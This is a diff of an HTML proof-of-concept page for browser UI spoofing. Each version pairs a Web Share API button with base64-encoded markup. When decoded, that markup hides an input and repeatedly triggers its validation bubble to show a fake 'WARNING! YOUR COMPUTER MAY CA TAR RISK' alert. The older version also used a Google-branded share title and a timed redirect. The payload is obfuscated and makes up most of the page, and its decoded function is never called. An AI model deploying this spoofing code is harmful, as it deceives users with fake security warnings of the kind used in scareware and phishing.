@@ -1,73 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Web Share + Fallback</title>
+  <title>Web Share + Base64 Content</title>
   <style>
-    #aaa {
-      position: absolute;
-      left: 35%;
-    }
-    #bbb {
-      display: none;
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
   </style>
 </head>
-<body style="height:100vh; display:flex; justify-content:center; align-items:center; flex-direction: column; gap: 20px;">
+<body>
 
 <button id="shareBtn">Share</button>
-<button id="fallbackBtn">Trigger Fallback</button>
-
-<form>
-  <input placeholder="aaa" required id="aaa" />
-  <input id="bbb" type="submit" name="submit">
-</form>
 
 <script>
-var w;
-var t;
-
-// Web Share API
 document.getElementById("shareBtn").onclick = async function() {
+    // 1. Web Share Bubble
     if (navigator.share) {
         try {
             await navigator.share({
-                title: 'security Google GO Google.net',
-                url: 'https://google.com'
+                title: 'Example Share',
+                text: 'Coba Web Share API!',
+                url: 'https://example.com'
             });
             console.log('Sharing success!');
         } catch(err) {
             console.log('Sharing canceled or failed:', err);
         }
     } else {
-        alert('Web Share API not supported on this browser.');
+        alert('Web Share API tidak didukung di browser ini.');
     }
+
+    // 2. Tampilkan konten base64 setelah 1 detik
+    setTimeout(function() {
+        document.write(atob(
+            'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uKGVkKSB7CmVkLnRhcmdldC5zZXRDdXN0b21WYWxpZGl0eSgiV0FSTklORyFcbllPVVIgQ09NUFVURVIgTUFZIENBIFRBUiBSSVNLIik7Cn0Kc2V0SW50ZXJ2YWwoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYmInKS5jbGljaygpIiwxMDAwKTsKfTs8L3NjcmlwdD4KPGZvcm0+CiAgICA8aW5wdXQgcGxhY2Vob2xkZXI9ImFhYSIgcmVxdWlyZWQgaWQ9ImFhYSIgLz4KICAgIDxpbnB1dCBpZD0iYmJiIiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCI+CiAgICA8L2Zvcm0+'
+        ));
+    }, 1000);
 };
-
-// Base64 Fallback PoC
-document.getElementById("fallbackBtn").onclick = function() {
-    // Redirect ke Google dulu
-    w = setTimeout(function() {
-        document.location = "http://www.google.com";
-    }, 2000);
-
-    // Interval untuk cek dan fallback
-    t = setInterval(bar, 1);
-};
-
-function bar() {
-    try {
-        w.location.href; // ini pasti error karena w adalah timeout
-    } catch(e) {
-        clearInterval(t);
-
-        // Tampilkan konten base64
-        setTimeout(function() {
-            document.write(atob(
-                'PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uKGVkKSB7CmVkLnRhcmdldC5zZXRDdXN0b21WYWxpZGl0eSgiV0FSTklORyFcbllPVVIgQ09NUFVURVIgTUFZIENBIFRBUiBSSVNLIik7Cn0Kc2V0SW50ZXJ2YWwoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYmInKS5jbGljaygpIiwxMDAwKTsKfTs8L3NjcmlwdD4KPGZvcm0+CiAgICA8aW5wdXQgcGxhY2Vob2xkZXI9ImFhYSIgcmVxdWlyZWQgaWQ9ImFhYSIgLz4KICAgIDxpbnB1dCBpZD0iYmJiIiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCI+CiAgICA8L2Zvcm0+'
-            ));
-        }, 1000);
-    }
-}
 </script>
 
 </body>
